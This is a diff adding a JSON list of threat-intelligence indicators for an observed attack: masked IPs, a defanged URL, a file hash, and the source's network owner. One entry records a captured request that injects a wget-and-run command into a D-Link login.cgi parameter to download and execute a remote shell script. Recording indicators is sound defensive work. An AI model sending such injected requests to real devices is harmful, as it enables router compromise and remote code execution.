@@ -1,0 +1,33 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "196.251.121.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://196.251.121.XXX/a3f8d2/dlink.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "GET /login.cgi?cli=aa%20aa%27;wget%20http://196.251.121.XXX/a3f8d2/dlink.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/"
+  },
+  {
+    "asn": "Gobernacion de la Provincia de Buenos Aires",
+    "country": "Argentina",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "170.155.2.XXX"
+  }
+]
